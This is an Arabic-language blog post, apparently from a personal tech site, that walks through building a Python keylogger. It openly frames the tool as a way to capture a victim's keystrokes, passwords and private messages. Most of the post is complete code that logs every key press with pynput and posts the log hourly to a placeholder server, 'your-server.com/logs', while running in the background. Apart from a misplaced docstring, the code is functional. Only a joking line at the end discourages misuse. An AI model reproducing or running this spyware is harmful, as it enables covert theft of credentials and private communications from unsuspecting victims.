---
title: "كتابة Keylogger بسيط باستخدام Python"
date: 2025-03-23
author: "Farouk"
layout: post
tags: [Python, Keylogger, Security]
direction: rtl
---

## **كيف تكتب Keylogger بسيط بالـ Python؟**


### **💡 المقدمة**

اول شي خلونا نفهم شو يعني **Ketlogger** , ال **Keylogger** هو عبارة عن برنامج بسجل عندي ضغطات الكيبورد تبع الضحية وهيك بقدر اعرف الحسابات وكلمات السر او حتى الرسائل الخاصة.
واليوم رح نعمل سوا **Keylogger بسيط بلغة Python** ونتعرف على آلية عمله بالتفصيل.

📌 **رح يغطي هذا الدرس:**
- كيف بتسجل ضغطات الكيبورد باستخدام مكتبة `pynput`
- تخزين هالبيانات ضمن ملف
- كيف نبعت هالملف من جهاز الضحية للسيرفر الخاص فينا
- وتشغيل برنامجنا ك **برنامج مستمر** يضل شغال بال**Background**

---

### **لكود كامل: Keylogger بالبايثون**

```python
import requests
import threading
from pynput.keyboard import Key, Listener

# رابط السيرفر لاستقبال البيانات
SERVER_URL = "http://your-server.com/logs"  # حط رابط السيرفر تبعك

def write_to_file(key):
    """
    تخزين ضغطات المفاتيح في ملف log.txt
    """
    try:
        keydata = str(key).replace("'", "")
    """
         تحليل المفاتيح الخاصة متل المسافات وزر الكونترول والتعامل معها
    """
        if key == Key.space:
            keydata = ' '
        elif key == Key.enter:
            keydata = '\n'
        elif key in (Key.shift, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r):
            keydata = '' 

        # حفظ البيانات في الملف
        with open('log.txt', 'a') as f:
            f.write(keydata)
    
    except Exception as e:
        print(f"Error: {e}")

def send_logs():
    """
    هون منبعت البيانات يلي خزناها كل ساعة
    """
    try:
        with open("log.txt", "r") as f:
            logs = f.read()
        
        if logs.strip():  # الإرسال فقط إذا كان هناك بيانات
            response = requests.post(SERVER_URL, data={"logs": logs})
            if response.status_code == 200:
                print("Logs sent successfully!")
                open("log.txt", "w").close()  # مسح الملف بعد الإرسال
            else:
                print(f"Failed to send logs, status code: {response.status_code}")
    
    except Exception as e:
        print(f"Error sending logs: {e}")

    # جدولة إعادة التنفيذ كل ساعة
    threading.Timer(3600, send_logs).start()

# بدء الإرسال التلقائي
send_logs()

# تشغيل الـ Keylogger
with Listener(on_press=write_to_file) as listener:
    listener.join()
```

---

### **تحليل الكود**

📌 **1. تسجيل ضغطات المفاتيح:**
- مكتبة ال`pynput` بتساعدني لتسجيل كل **ضغطة زر** عالكيبورد وتحليلها.
- المفاتيح الخاصة (مثل `Shift` و `Enter`) منتعامل معها بطريقة مناسبة.
-  **منحفظ كل ضغطة عالكيبورد** بملف `log.txt`.

📌 **2. إرسال البيانات إلى سيرفر:**
- منقرأ محتوى ملف `log.txt` كل **ساعة**.
- إذا كان عندي بيانات، فبيبعتلي ياها ل  **السيرفر** عبر `requests.post()`.
- بعد ما يتم الارسال بقلو **يمسحلي الملف** حتى مايصير عندي تكرار بالإرسال.

📌 **3. تشغيل الكي لوجر بالخلفية:**
- استخدمت `threading.Timer` حتى يضل عم يرسل البيانات بشكل دوري.
- `Listener` بضل شغال حتى حدا **يوقف البرنامج يدويًا**.



---

### **الخاتمة**

هيك صار عندك **Keylogger بسيط وفعال** وهاد الشي حتى تفهم آلية عمله ويكون عندك الفهم البرمجي لطريقة عمله, فلا تستخدموا بطريقة غلط🌚.

**🤔وهلق خبرني شو رأيك بالكود؟ وهل عندك أفكار لتطويره؟**
